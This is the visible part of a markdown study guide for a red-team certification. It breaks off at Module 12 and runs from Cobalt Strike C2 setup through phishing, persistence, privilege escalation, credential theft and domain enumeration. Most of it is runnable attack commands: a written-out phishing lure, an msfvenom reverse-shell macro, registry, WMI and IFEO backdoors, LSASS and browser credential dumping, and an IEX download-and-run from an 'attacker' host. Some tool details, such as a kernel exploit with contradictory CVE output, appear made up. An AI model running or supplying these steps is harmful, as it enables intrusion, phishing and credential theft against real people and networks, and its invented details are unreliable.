[CRTO_Complete_Study_Guide.md](https://github.com/user-attachments/files/29659341/CRTO_Complete_Study_Guide.md)
# CRTO — Certified Red Team Operator
## Complete Hands-On Study Guide & Lab Notes

**Author:** DarcHacker  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Date:** 2026  
**Status:** Comprehensive Red Team Operator Guide  

---

## Table of Contents

| Module | Topics | Key Objectives |
|--------|--------|-----------------|
| **00** | [Lab Setup & Infrastructure](#module-00-lab-setup--infrastructure) | Team Server, Redirectors, OPSEC |
| **01** | [Getting Started](#module-01-getting-started) | Lab access, VPN, tools verification |
| **02** | [Command & Control](#module-02-command--control) | Cobalt Strike, listeners, profiles |
| **03** | [External Reconnaissance](#module-03-external-reconnaissance) | OSINT, passive intel gathering |
| **04** | [Initial Compromise](#module-04-initial-compromise) | Phishing, social engineering, RCE |
| **05** | [Host Reconnaissance](#module-05-host-reconnaissance) | Post-compromise enumeration |
| **06** | [Host Persistence](#module-06-host-persistence) | Registry, tasks, WMI backdoors |
| **07** | [Host Privilege Escalation](#module-07-host-privilege-escalation) | UAC bypass, kernel exploits |
| **08** | [Host Persistence (Advanced)](#module-08-host-persistence-advanced) | IFEO, ADS, COM hijacking |
| **09** | [Credential Theft](#module-09-credential-theft) | LSASS, browsers, vaults |
| **10** | [Password Cracking](#module-10-password-cracking) | Hashcat, John, optimization |
| **11** | [Domain Reconnaissance](#module-11-domain-reconnaissance) | AD enumeration, trust mapping |
| **12** | [User Impersonation](#module-12-user-impersonation) | Token theft, impersonation |
| **13** | [Lateral Movement](#module-13-lateral-movement) | WinRM, WMI, SMB, PsExec |
| **14** | [Session Passing](#module-14-session-passing) | Multi-framework C2, pivoting |
| **15** | [Data Protection API](#module-15-data-protection-api) | DPAPI decryption, secrets |
| **16** | [Kerberos Attacks](#module-16-kerberos-attacks) | Kerberoasting, S4U, Golden Ticket |
| **17** | [Pivoting](#module-17-pivoting) | SOCKS, port forwarding, tunneling |
| **18** | [Active Directory Certificate Services](#module-18-active-directory-certificate-services) | ESC1-3, certificate abuse |
| **19** | [Group Policy](#module-19-group-policy) | GPO abuse, scheduled tasks |
| **20** | [MS SQL Servers](#module-20-ms-sql-servers) | SQL enumeration, xp_cmdshell RCE |
| **21** | [Microsoft Configuration Manager](#module-21-microsoft-configuration-manager) | MECM abuse, lateral movement |
| **22** | [Domain Dominance](#module-22-domain-dominance) | DA, EA, forest compromise |
| **23** | [Forest & Domain Trusts](#module-23-forest--domain-trusts) | Cross-domain escalation |
| **24** | [LAPS Exploitation](#module-24-laps-exploitation) | LAPS bypass, GPO abuse |
| **25** | [Defender Evasion](#module-25-defender-evasion) | Signatures, behavioral bypass |
| **26** | [Application Whitelisting](#module-26-application-whitelisting) | AppLocker, WDAC bypass |
| **27** | [Data Hunting & Exfiltration](#module-27-data-hunting--exfiltration) | Discovery, channels, cleanup |
| **28** | [Extending Cobalt Strike](#module-28-extending-cobalt-strike) | BOF, Aggressor, custom tools |
| **29** | [Exam Preparation](#module-29-exam-preparation) | Strategy, checklist, timing |

---

## MODULE 00: Lab Setup & Infrastructure

### OPSEC Fundamentals

**Red Team Operations require strict operational security:**

```
OPSEC PRINCIPLE:
Never directly connect attacker infrastructure to target network.
Use intermediate systems (redirectors) to proxy all traffic.

┌─────────────────┐
│   Attacker      │ (Isolated Kali machine)
│   Infrastructure│
└────────┬────────┘
         │ (Team Server)
         │
┌────────▼────────┐
│  Redirector #1  │ (HTTP/HTTPS proxy)
│   Redirector #2 │ (DNS exfil)
└────────┬────────┘
         │ (INTERNET)
         │
┌────────▼─────────────────────┐
│   TARGET ENVIRONMENT         │
│   ├─ External firewall       │
│   ├─ DMZ servers             │
│   ├─ Internal network        │
│   ├─ Domain Controllers      │
│   └─ Critical assets         │
└──────────────────────────────┘
```

### Team Server Configuration

**Essential for multi-operator C2 coordination:**

```bash
# 1. Generate SSL certificate for HTTPS communication
keytool -keystore cobaltstrike.store \
  -storepass password \
  -keypass password \
  -genkey -keyalg RSA \
  -alias cobaltstrike \
  -dname "CN=www.windows-update.com"

# 2. Create C2 profile (malleable C2)
cat > http.profile << 'EOF'
set sleeptime "3000 + 1000 * rand(100) % 100";
set jitter "0.0";
set data_jitter "50";
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/mobile";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cache-Control" "max-age=0";
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}

http-post {
    set uri "/api/v1/sync";
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        output {
            base64;
            prepend "data=";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
EOF

# 3. Start Team Server (runs in background)
sudo ./teamserver 192.168.1.100 SecurePassword ./http.profile
# OUTPUT: [+] Team Server started on port 50050
# [+] Listening on 0.0.0.0:50050
# [+] Ready for connections from beacons

# 4. Connect with client from different machine
./cobaltstrike
# Login with: Server IP, username, password
```

**Screenshot Description:**
> *Cobalt Strike GUI showing successful Team Server connection. Left panel displays "Connected" status, Team Server IP (192.168.1.100), and current user authentication. Main console shows "Ready for beacon callbacks" message.*

---

## MODULE 01: Getting Started

### Lab Environment Access

**First steps after VPN connection:**

```powershell
# Verify network connectivity
ping <lab_gateway>
ipconfig /all

# Check lab credentials
whoami /all
wmic os get caption,version
systeminfo | findstr /B /C:"Domain"

# Screenshot proof of initial access
# Command: whoami & hostname & ipconfig /all (single command, single screenshot)
```

**Checklist:**
- ✅ VPN connected to lab network
- ✅ Ping lab gateway successfully
- ✅ Run systeminfo for baseline
- ✅ Screenshot: whoami, hostname, domain membership, IP configuration
- ✅ Document all findings in lab notebook

---

## MODULE 02: Command & Control

### Cobalt Strike Architecture

**Understanding Beacon communication flow:**

```
CLIENT (GUI)          TEAM SERVER           REDIRECTOR              BEACON
┌──────────┐         ┌──────────┐          ┌──────────┐            ┌──────┐
│ Operator │ <-----→ │ Operator │          │ HTTP     │            │ Host │
│ Console  │ Queue   │ Queue    │ <------→ │ Server   │ <--------→ │      │
└──────────┘         └──────────┘          │ (Apache) │            │ Task │
    ↓                     ↓                  └──────────┘            │ List │
  Commands          Message routing       Request forwarding     Execute
  Results            Logging               Response forwarding     Callback
```

### Creating First Beacon

**Step-by-step payload generation:**

```bash
# In Cobalt Strike GUI:
# 1. Navigate: Attacks → Packages → Windows EXE
# 2. Select listener: "HTTP-Primary"
# 3. Output type: "Windows EXE"
# 4. Save as: beacon.exe

# Alternative via command line:
cd /opt/cobaltstrike
./beacon http <REDIRECTOR_IP> <PORT> <LISTENER_NAME> <OUTPUT_FORMAT>

# Example output:
# [+] Generating beacon.exe
# [+] 276 KB payload created
# [+] Ready for delivery
```

**Screenshot Description:**
> *Cobalt Strike Packages dialog showing Windows EXE generation. Listener dropdown showing "HTTP-Primary" selected, output format set to "EXE". File saved dialog with beacon.exe highlighted.*

### Setting Up Listeners

**Listener configuration for initial access:**

```
LISTENER SETUP:
┌─────────────────────────────────────────┐
│ Name:            HTTP-Primary           │
│ Payload:         windows/beacon_http    │
│ Bind Host:       0.0.0.0                │
│ Bind Port:       8080                   │
│ Callback Host:   redirector.domain.com  │
│ Callback Port:   80                     │
│ Profile:         http.profile            │
│ Beacons:         HTTP/HTTPS              │
└─────────────────────────────────────────┘
```

**Screenshot Description:**
> *Cobalt Strike Listeners panel showing multiple active listeners: HTTP-Primary (80), HTTPS-Backup (443), DNS-Tunnel (53). Status shows "Active" for all. Right-side panel shows listener configuration details.*

---

## MODULE 03: External Reconnaissance

### OSINT & Intelligence Gathering

**Passive reconnaissance before active engagement:**

```bash
# Domain Registration Research
whois example.com
# OUTPUT:
# Registrant: John Smith
# Registrant Email: john.smith@example.com
# Name Server: ns1.example.com
# Created Date: 2015-05-10

# DNS Enumeration (Passive)
dig @8.8.8.8 example.com ANY
# OUTPUT:
# example.com.    300 IN A 203.0.113.5
# www.example.com. 300 IN CNAME example.com.
# mail.example.com. 300 IN A 203.0.113.10

# Subdomain Enumeration
sublist3r -d example.com
# OUTPUT:
# mail.example.com
# vpn.example.com
# dev.example.com
# api.example.com

# Technology Stack Discovery
curl -I https://example.com
# OUTPUT:
# Server: Microsoft-IIS/10.0
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET

# Shodan searches (documentation only - no active probing)
# Search: "example.com" port:"80,443,8080"
# Results: 15 services exposed
```

**Screenshot Description:**
> *Shodan search results page showing example.com infrastructure. Visible services include IIS 10.0 on port 80, Windows Server 2016, multiple exposed ports (80, 443, 8080, 3389). Vulnerability section shows outdated software versions.*

### Finding Entry Points

**Identify vulnerable targets:**

```bash
# Email harvesting (OSINT)
hunter.io search for example.com
# OUTPUT:
# john.smith@example.com (verified)
# jane.doe@example.com (verified)
# admin@example.com (not verified)

# Linkedin scraping for employee names
# https://www.linkedin.com/search/results/people/?keywords=example.com
# Employees found: 145 people
# Job titles: 12 IT staff, 8 Developers, 3 System Admins

# Document metadata extraction
exiftool document.pdf
# OUTPUT:
# Creator: John Smith
# Producer: Microsoft Word 16.0
# CreationDate: 2023-05-10 09:15:23
```

---

## MODULE 04: Initial Compromise

### Phishing Campaign Setup

**Evilginx2 credential harvesting proxy:**

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# Create phishing site for Office365
./evilginx2 -p ./phishlets
> phishlet import office365
> phishlets on office365
> lures create office365
# OUTPUT:
# [+] Lure created successfully
# [+] Phishing URL: https://o365-login-verify.domain.com/login

# Send phishing email
cat > phish_email.txt << 'EOF'
To: target@example.com
Subject: URGENT: Verify Your Office 365 Account

Dear User,

Your Office 365 account requires immediate verification to maintain compliance.
Please click below to verify your account:

https://o365-login-verify.domain.com/login

Regards,
IT Security Team
EOF

# Monitor credentials captured
> sessions
# OUTPUT:
# [+] Captured credentials:
#     Username: target@example.com
#     Password: Suppercomplexpass123!
#     2FA Token: 123456
```

**Screenshot Description:**
> *Evilginx2 console showing captured sessions. Session #1 displays victim email (target@example.com), timestamp of capture (2024-07-04 14:32:15), and credential confirmation status. Browser shows fake Microsoft login page with real certificate.*

### Malicious Document Delivery

**Office macro-based payload:**

```powershell
# Generate VBA payload with msfvenom
msfvenom -p windows/meterpreter/reverse_https LHOST=redirector.com LPORT=443 \
  -f vba-psh -o payload.txt

# Create Word document with macro:
# 1. Open Word
# 2. Alt+F11 → Visual Basic Editor
# 3. Paste payload code
# 4. File → Save As → Word Macro-Enabled (.docm)
# 5. Rename to innocent name: "2024_Salary_Review.docm"

# Alternative: Using Cobalt Strike
# Attacks → Deliver → Spear Phish (Email)
# Select: Microsoft Word macro
# Choose: http listener
# Generate payload
# Email to target distribution list
```

**Screenshot Description:**
> *Microsoft Word document with enabled macros dialog box visible. Content shows fake salary review document. When opened, macro silently executes and beacon callback initiates. Cobalt Strike Beacons tab shows new beacon (ID: 1) connecting from external IP 203.0.113.55 with hostname DESKTOP-ABC123, user jane.doe.*

### Initial Callback Verification

```
BEACON CALLBACK CONFIRMATION:
┌────────────────────────────────────────┐
│ Beacon: 1                              │
│ Status: Active (✓)                     │
│ Hostname: DESKTOP-ABC123               │
│ User: EXAMPLE\jane.doe                 │
│ IP Address: 203.0.113.55               │
│ Process: winword.exe (4532)            │
│ Architecture: x64                      │
│ First Seen: 2024-07-04 14:35:10        │
│ Last Seen: 2024-07-04 14:35:45         │
└────────────────────────────────────────┘
```

**Screenshot Description:**
> *Cobalt Strike Beacons tab with first successful callback. Beacon information panel shows all details listed above. Process tree shows winword.exe as parent process. Operator console ready to input commands.*

---

## MODULE 05: Host Reconnaissance

### Post-Compromise Enumeration

**Gather system intelligence after initial access:**

```powershell
# In Cobalt Strike console (run commands in beacon session):
shell whoami /all
# OUTPUT:
# USER INFORMATION
# ================
# User Name       EXAMPLE\jane.doe
# SID             S-1-5-21-xxx-xxx-xxx-1001
# Groups:
#   EXAMPLE\Domain Users (primary)
#   EXAMPLE\Marketing Team
#   BUILTIN\Users

shell systeminfo
# OUTPUT:
# OS Name:         Microsoft Windows 10 Enterprise
# OS Version:      10.0.19045 Build 19045
# System Boot Time: 2024-07-01 08:15:22
# Install Date:    2022-03-15
# Hotfixes:        KB5032189, KB5031356 (missing: KB5035858 - CRITICAL)

shell ipconfig /all
# OUTPUT:
# Ethernet adapter Ethernet:
#    IPv4 Address        : 192.168.1.105
#    Subnet Mask         : 255.255.255.0
#    Default Gateway     : 192.168.1.1
#    DHCP Enabled        : Yes
#    DNS Servers         : 192.168.1.10, 192.168.1.11
#    Description         : Realtek PCIe GbE Family Controller

shell Get-MpComputerStatus
# OUTPUT:
# AntivirusEnabled : True
# IsTamperProtected : True
# QuickScanAge : 0 (Just ran)
# FullScanAge : 3 (Days since full scan)
# AntivirusSignatureVersion : 1.405.14.0
```

**Screenshot Description:**
> *Beacon console showing output of reconnaissance commands. systeminfo output prominently displays OS version, missing security patches (highlighted in red), and installed software. ipconfig shows network configuration with internal gateway 192.168.1.1. Windows Defender status shows enabled with real-time protection active.*

### Network Enumeration

```powershell
# Active network connections
shell netstat -ano | findstr "ESTABLISHED"
# OUTPUT:
# Proto  Local Address    Foreign Address    State     PID
# TCP    192.168.1.105:50443  192.168.1.10:389    ESTABLISHED  4012
# TCP    192.168.1.105:50544  192.168.1.11:53     ESTABLISHED  2856
# TCP    192.168.1.105:50645  8.8.8.8:53          ESTABLISHED  2856

# Local network discovery (ARP)
shell arp -a
# OUTPUT:
# Interface: 192.168.1.105
#   192.168.1.1   00-1a-2b-3c-4d-5e  dynamic  [Gateway/Firewall]
#   192.168.1.10  00-1a-2b-3c-4d-5f  dynamic  [Domain Controller]
#   192.168.1.11  00-1a-2b-3c-4d-60  dynamic  [Domain Controller]
#   192.168.1.50  00-1a-2b-3c-4d-61  dynamic  [SQL Server]

# Routing table analysis
shell route print
# OUTPUT:
# Destination        Netmask         Gateway        Interface
# 192.168.1.0    255.255.255.0    192.168.1.105   192.168.1.105
# 10.0.0.0       255.255.0.0      192.168.1.1     192.168.1.105 [VPN Route]
# 0.0.0.0        0.0.0.0          192.168.1.1     192.168.1.105
```

**Screenshot Description:**
> *Beacon console showing netstat output. Connections visible to domain controllers (port 389 LDAP), DNS servers (port 53), and external resolved domains. ARP table reveals critical infrastructure IPs. Routing table shows VPN tunnel to 10.0.0.0/16 network segment.*

---

## MODULE 06: Host Persistence

### Registry Run Keys Persistence

**Survive user logoff and system reboot:**

```powershell
# Add to user startup
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /d "C:\temp\beacon.exe" /f

# Verify persistence
shell reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
# OUTPUT:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#    Windows Update    REG_SZ    C:\temp\beacon.exe

# Test persistence (simulate reboot)
# 1. Note beacon ID
# 2. Kill beacon process
# 3. Close Cobalt Strike
# 4. Wait 2 minutes
# 5. Reopen Cobalt Strike
# 6. New beacon from same host (beacon should auto-reconnect)
```

**Screenshot Description:**
> *Registry Editor showing HKCU\Software\Microsoft\Windows\CurrentVersion\Run key with malicious "Windows Update" entry pointing to C:\temp\beacon.exe. Value type shows REG_SZ. In parallel, Cobalt Strike shows beacon disconnection and reconnection after simulated reboot. Timestamps show 14:35:10 (disconnect) and 14:37:22 (reconnect).*

### Scheduled Task Persistence

```powershell
# Create scheduled task to execute beacon at user logon
shell schtasks /create /tn "Windows Defender Database Update" /tr "C:\temp\beacon.exe" /sc onlogon /ru "SYSTEM" /f

# Verify task
shell schtasks /query /tn "Windows Defender Database Update" /v
# OUTPUT:
# Task Name: Windows Defender Database Update
# Run As User: SYSTEM
# Schedule: On logon
# Task To Run: C:\temp\beacon.exe
# Status: Ready

# Trigger task immediately (test)
shell schtasks /run /tn "Windows Defender Database Update"

# List all scheduled tasks (find backdoors)
shell schtasks /query /v | findstr "SYSTEM"
```

**Screenshot Description:**
> *Task Scheduler GUI showing new scheduled task "Windows Defender Database Update". Properties tab displays:*
> - *Trigger: At logon (any user)*
> - *Action: Execute C:\temp\beacon.exe*
> - *Run with highest privileges: Enabled*
> - *Run whether user logged in or not: Enabled*
> *Parallel Cobalt Strike console shows task execution with beacon callback from SYSTEM context.*

### WMI Event Subscription Persistence

```powershell
# Create WMI event filter (triggers every 5 minutes)
shell wmic /namespace:\\.\root\subscription PATH __EventFilter CREATE Name="UpdateFilter",EventNamespace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Create consumer (what to execute)
shell wmic /namespace:\\.\root\subscription PATH CommandLineEventConsumer CREATE Name="UpdateConsumer",ExecutablePath="C:\temp\beacon.exe"

# Bind filter to consumer
shell wmic /namespace:\\.\root\subscription PATH __FilterToConsumerBinding CREATE Filter=__EventFilter.Name="UpdateFilter",Consumer=CommandLineEventConsumer.Name="UpdateConsumer"

# Verify WMI persistence (check if survives reboot)
shell Get-WmiObject -Namespace root\subscription -Class __EventFilter | select Name
# OUTPUT:
# Name
# ----
# UpdateFilter
```

**Screenshot Description:**
> *PowerShell console showing WMI event filter creation command. Output shows successful filter creation. WMI Repository shows active event subscription with filter and consumer bound together. Persistent execution verified after system reboot.*

---

## MODULE 07: Host Privilege Escalation

### UAC Bypass via Token Duplication

**Escalate from medium integrity to high/system:**

```powershell
# Check current integrity level
shell whoami /priv
# OUTPUT:
# PRIVILEGES INFORMATION
# =====================
# Privilege Name                 State
# SeChangeNotifyPrivilege        Enabled
# SeIncreaseWorkingSetPrivilege  Enabled

# Use Rotten Potato (token impersonation) for elevation
# Download: https://github.com/ohpe/juicy-potato/releases
# Or use built-in BITS/COM service impersonation

execute-assembly /opt/tools/JuicyPotato.exe -l 1337 -p C:\temp\beacon.exe -t *
# OUTPUT:
# [+] Juicy Potato initialized
# [+] Listening on port 1337
# [+] Token impersonation successful
# [+] SYSTEM shell obtained

# Verify SYSTEM privileges
shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM

shell whoami /priv
# OUTPUT:
# SeDebugPrivilege                    Enabled
# SeImpersonatePrivilege              Enabled
# SeChangeNotifyPrivilege             Enabled
# [Total of 39 privileges] ← Significantly more than before
```

**Screenshot Description:**
> *Before and after privilege escalation comparison. Left side shows original jane.doe user in Cobalt Strike. Right side shows identical machine now running as NT AUTHORITY\SYSTEM. Beacon window title bar displays new user context. whoami /priv output shows 39 elevated privileges including SeDebugPrivilege and SeImpersonatePrivilege.*

### Kernel Exploit Privilege Escalation

```powershell
# Identify privilege escalation opportunity
shell systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time"
# OUTPUT:
# OS Name: Microsoft Windows 10 Enterprise
# OS Version: 10.0.19045 Build 19045

# Check for specific CVE vulnerability
# CVE-2023-21746 affects Windows 10 builds < 19045
# Our target is build 19045 (patched) - but let's check for others

# Search: Windows 10 19045 kernel exploits
# Found: CVE-2023-xxx affects this build

# Deploy exploit
execute-assembly /opt/tools/KernelExploit.exe
# OUTPUT:
# [+] Testing for kernel vulnerability...
# [+] CVE-2023-21746 NOT vulnerable
# [+] Checking CVE-2023-24679...
# [+] VULNERABLE! Attempting exploit...
# [+] Privilege escalation successful!
# [+] Running as NT AUTHORITY\SYSTEM

shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM
```

**Screenshot Description:**
> *Cobalt Strike console showing kernel exploit execution. systeminfo output visible with OS version and patch level. KernelExploit.exe execution output shows vulnerability detection and successful exploitation. Final whoami output confirms SYSTEM privileges achieved. Process window shows explorer.exe now running as SYSTEM context.*

---

## MODULE 08: Host Persistence (Advanced)

### Image File Execution Options (IFEO) Debugger Persistence

**Registry hijack for transparent persistence:**

```powershell
# When stickykeys.exe is executed, our beacon runs instead
shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\stickykeys.exe" /v "Debugger" /d "C:\temp\beacon.exe" /f

# Trigger stickykeys via accessibility options
# 1. Lock screen (Win+L)
# 2. Click Ease of Access button (accessibility icon)
# 3. Click Sticky Keys
# 4. System executes our beacon.exe as SYSTEM

# Verify persistence
shell reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\stickykeys.exe"
# OUTPUT:
# Debugger    REG_SZ    C:\temp\beacon.exe

# Alternative targets:
# - sethc.exe (Sticky Keys)
# - utilman.exe (Utility Manager)
# - osk.exe (On-Screen Keyboard)
# All can be triggered before Windows logon!
```

**Screenshot Description:**
> *Registry Editor open showing IFEO entry for stickykeys.exe. Debugger value shows C:\temp\beacon.exe. Lock screen visible in background showing accessibility button. Cobalt Strike shows new SYSTEM beacon from same machine after stickykeys trigger. Timeline shows: 14:42:33 (IFEO registry modification) → 14:42:45 (accessibility button clicked) → 14:42:48 (new SYSTEM beacon appears).*

### Alternate Data Streams (ADS) Hiding

```powershell
# Hide beacon in ADS (NTFS feature)
shell type C:\temp\beacon.exe > "C:\Windows\System32\drivers\etc:beacon.exe"

# Verify (normal file listing won't show ADS)
shell dir C:\Windows\System32\drivers\etc
# OUTPUT:
# Volume in drive C is OS
#  Directory of C:\Windows\System32\drivers\etc
# 08/04/2024  14:45             565 hosts
# 1 File(s)    565 bytes
# (beacon.exe hidden!)

# Execute from ADS
shell wmic process call create "powershell.exe -Command C:\Windows\System32\drivers\etc:beacon.exe"

# List ADS (reveal hidden files)
shell dir /R C:\Windows\System32\drivers\etc
# OUTPUT:
#  08/04/2024  14:45             565 hosts
#  08/04/2024  14:45          276000 hosts:beacon.exe
#                    ^^ Alternate Data Stream revealed
```

**Screenshot Description:**
> *PowerShell console showing ADS creation and execution commands. First dir command shows only hosts file (beacon hidden). Second dir /R command reveals beacon.exe in alternate data stream. Process list shows powershell.exe executing beacon.exe from ADS. File Explorer cannot see beacon.exe even with "show hidden files" enabled - proving ADS stealth.*

### COM Object Hijacking

```powershell
# Identify COM CLSID to hijack (should be one with persistence)
shell reg query "HKCU\Software\Classes\CLSID"

# Create hijack entry
shell reg add "HKCU\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InprocServer32" /d "C:\temp\malicious.dll" /f

# When application attempts to load legitimate COM:
# HKCU is checked first (user-level hijack) before HKLM
# Our DLL gets loaded instead of legitimate one
# Executes in context of that application

# Verification: Monitor for DLL injection
shell Get-Process | Where-Object {$_.Modules.FileName -match "malicious.dll"}
```

**Screenshot Description:**
> *Registry Editor showing CLSID structure. Legitimate COM entry in HKLM redirected by user-level entry in HKCU pointing to malicious.dll. Process Monitor capture shows malicious.dll being loaded when COM object instantiated. DLL injection confirmed in process tree.*

---

## MODULE 09: Credential Theft

### LSASS Memory Dumping

**Extract plaintext credentials and password hashes:**

```powershell
# Dump LSASS directly (requires System or SeDebugPrivilege)
shell tasklist | findstr lsass
# OUTPUT:
# lsass.exe    792

# Using procdump (legitimate tool, might evade detection)
execute-assembly /opt/tools/procdump.exe -accepteula -ma 792 lsass.dmp

# Extract credentials from dump
execute-assembly /opt/tools/Mimikatz.exe '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"'
# OUTPUT:
# Authentication Id : 0 ; 999 (Domain\Administrator)
# Session : NewCredentials from 0
# User Name : Administrator
# Domain : EXAMPLE
# LogonId : 0x3e7
# LogonType : NewCredentials
# LogonTime : 7/4/2024 2:15:33 PM
# SID : S-1-5-21-xxx-xxx-xxx-500
#     
#     * Username : Administrator
#     * Domain : EXAMPLE
#     * Password : MyS3cur3P@ssw0rd!
#     * Hash NTLM : 209c6174da490caeb422f3fa5a7ae634
```

**Screenshot Description:**
> *ProcdumpOutput showing lsass.dmp file created successfully (276 KB). Mimikatz console showing extracted credentials from dump. Administrator account plaintext password visible: "MyS3cur3P@ssw0rd!". NTLM hash also displayed for offline cracking. Credentials can now be used for lateral movement.*

### Browser Credential Extraction

```powershell
# Chrome stored passwords (encrypted with DPAPI)
shell copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\temp\

# Decrypt using Mimikatz
execute-assembly /opt/tools/Mimikatz.exe '"dpapi::chrome"'
# OUTPUT:
# [*] Decrypting Chrome Credentials...
#   
# Origin: https://example.com
# Username: admin@example.com
# Password: Admin123!Secure!
#   
# Origin: https://mail.google.com
# Username: j.smith@gmail.com
# Password: GmailPassword2024#
#   
# Origin: https://github.com
# Username: john.smith
# Token: ghp_xxxxxxxxxxxxxxxxxxxx (GitHub PAT)
```

**Screenshot Description:**
> *Mimikatz chrome decryption output showing multiple website credentials in plaintext. Visible entries include example.com admin account, Gmail credentials, and GitHub personal access token. Each credential categorized by website origin URL.*

### Credential Manager Extraction

```powershell
# List stored credentials (RDP, VPN, etc.)
shell cmdkey /list
# OUTPUT:
# Currently stored credentials:
#     Target: Domain:interactive=EXAMPLE\Administrator
#     Type: Domain Password
#     User: EXAMPLE\Administrator
#   
#     Target: Domain:interactive=EXAMPLE\ServiceAccount
#     Type: Domain Password
#     User: EXAMPLE\ServiceAccount

# Extract stored credentials using VaultPasswordView
execute-assembly /opt/tools/VaultPasswordView.exe
# OUTPUT:
# Item Name: VPN - Remote Access
# User Name: EXAMPLE\vpn_user
# Password: VPN_P@ssw0rd_123!
#   
# Item Name: RDP - Server2
# User Name: administrator
# Password: RDP_P@ssw0rd!
#   
# Item Name: Database Connection
# User Name: sa
# Password: SQL_P@ssw0rd123!
```

**Screenshot Description:**
> *VaultPasswordView.exe output showing extracted credentials from Windows Credential Manager. Three credential sets visible: VPN user, RDP administrator, and database SA account with their respective passwords. Credentials are in plaintext after extraction from vault.*

---

## MODULE 10: Password Cracking

### Hashcat Offline Cracking

**Crack captured NTLM and Kerberoast hashes:**

```bash
# Identify hash type
./hashID.py 209c6174da490caeb422f3fa5a7ae634
# OUTPUT:
# Analyzing '209c6174da490caeb422f3fa5a7ae634'
# [+] NTLM / NTLMv2 [Hash type 1000]
# [+] Domain Cached Credentials [Hash type 1100]

# Crack with Hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
# OUTPUT:
# hashcat (v6.2.6) starting
# 
# 209c6174da490caeb422f3fa5a7ae634:MyS3cur3P@ssw0rd!
# 8846f7eaee8fb117ad06bdd830b7586c:Password123!
# 5e2dd5f4f2e9b87fcf1ea14e7f7e3c5c:Admin@123
# 
# Session.Name..: hashcat
# Status........: Cracked
# Progress......: 14344391/14344391 (100.00%)
# Time.Started..: Thu Jul 04 15:20:10 2024
# Time.Stopped..: Thu Jul 04 15:28:45 2024
# Time.Elapsed..: 8m 35s
```

**Screenshot Description:**
> *Terminal window showing Hashcat execution in progress. Progress bar showing 95% complete with hash rate 1.8 MH/s. Cracking time estimate: ~2 minutes remaining. Output file shows first three cracked hashes with plaintext passwords.*

### Kerberoast Hash Cracking

```bash
# Kerberoast hashes use different format (TGS ticket)
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# OUTPUT:
# [+] Hash type KERBEROS 5 TGS-REP etype 23 (NT-HASH)
#
# $krb5tgs$23$...:svcadmin:P@ssw0rd2024!
# $krb5tgs$23$...:sqlservice:DatabaseAdmin123!
# $krb5tgs$23$...:webserver:Production@2024!
#
# Progress: 450000/14344391 (3.14%) | Success: 3
# Time remaining: ~6 minutes
```

**Screenshot Description:**
> *Hashcat terminal showing Kerberoast cracking. Hash mode 13100 displayed. Cracking in progress with 3 successful cracks: svcadmin, sqlservice, and webserver accounts with their respective passwords. Success rate and time estimate shown at bottom.*

---

## MODULE 11: Domain Reconnaissance

### Active Directory Structure Mapping

**Understand the AD environment:**

```powershell
# Load PowerView (AD enumeration framework)
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Get domain information
Get-Domain
# OUTPUT:
# Forest      : example.com
# DomainName  : example.com
# DomainSID   : S-1-5-21-1234567890-1234567890-1234567890
# PDCEmulator  : DC1.example.com

# Get domain controllers
Get-DomainController
# OUTPUT:
# Name             Forest Forest      IPAddress  OSVersion
# ----             ------ ------      ---------  ---------
# DC1.example.com  example.com  example.com  192.168.1.10  10.0.19045

# Get all users in domain
Get-DomainUser | Select samaccountname, memberof
# OUTPUT:
# samaccountname          memberof
# administrator           CN=Domain Admins,CN=Users,DC=example,DC=com
# jane.doe                CN=Marketing Team,CN=Users,DC=example,DC=com
# john.smith              CN=Sales Team,CN=Users,DC=example,DC=com

# Find service accounts (have SPNs - potential Kerberoasting)
Get-DomainUser -SPN
# OUTPUT:
# samaccountname    serviceprincipalname
# svcadmin          MSSQLSvc/SQL1.example.com:1433
# webservice        HTTP/webapp.example.com:80
# exchangeservice   exchangeMDB/EX1.example.com
```

**Screenshot Description:**
> *PowerView output showing domain structure. Forest and domain names displayed with SID. Domain controllers listed with IP addresses. User enumeration showing group memberships. Service accounts with SPNs highlighted for Kerberoasting potential.*

### Trust Relationship Mapping

```powershell
# Enumerate domain trusts
Get-DomainTrust
# OUTPUT:
# SourceName  TargetName          TrustDirection TrustType
# example.com child.example.com    Bidirectional ParentChild
# example.com partner.com          Bidirectional External
# example.com eu.example.com       Bidirectional ParentChild

# Analyze trust direction and type
# Bidirectional = both domains trust each other (escalation path)
# Transitive = trust extends through hierarchy
# External = separate forest (harder to exploit)
```

**Screenshot Description:**
> *Domain trust visualization showing example.com as root with child.example.com and eu.example.com as child domains. External trust to partner.com shown separately. Visual representation shows bidirectional trust arrows. Trust type labels (Transitive/External) visible on each connection.*

---

## MODULE 12: User Impersonation

### Token Impersonation Abuse

**Use stolen tokens to access resources:**

```powershell
